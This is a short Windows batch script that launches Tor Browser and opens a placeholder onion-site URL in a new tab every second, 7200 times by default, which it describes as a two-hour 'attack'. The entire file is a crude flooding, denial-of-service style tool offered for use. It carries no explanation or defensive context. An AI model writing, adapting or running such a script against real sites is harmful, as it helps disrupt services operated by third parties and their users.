@ECHO OFF

set url="http://urlOfOnionSite.onion/"
set TORPath="PathToTORBrowser\Tor Browser\Browser\firefox.exe"
set  /A attackTimes=7200

ECHO Starting TOR.
ECHO Commencing attack on :
ECHO %url%
ECHO within 10 seconds. 
ECHO The attack is carried out once every second. 
ECHO Thus "attackTimes=7200" will result in a 2 Hour attack, and so on.
ECHO attackTimes set = %attackTimes%

set  /A HRS=%attackTimes%/3600

ECHO Thus, time taken for current attacks to complete = %HRS% HRS

timeout /t 10 /nobreak

FOR /L %%A IN (1,1,%attackTimes%) DO (
  ECHO Bonk %%A
  %TORPath% --allow-remote  --new-tab %url%
  timeout /t 1 /nobreak>NUL
)

cmd /k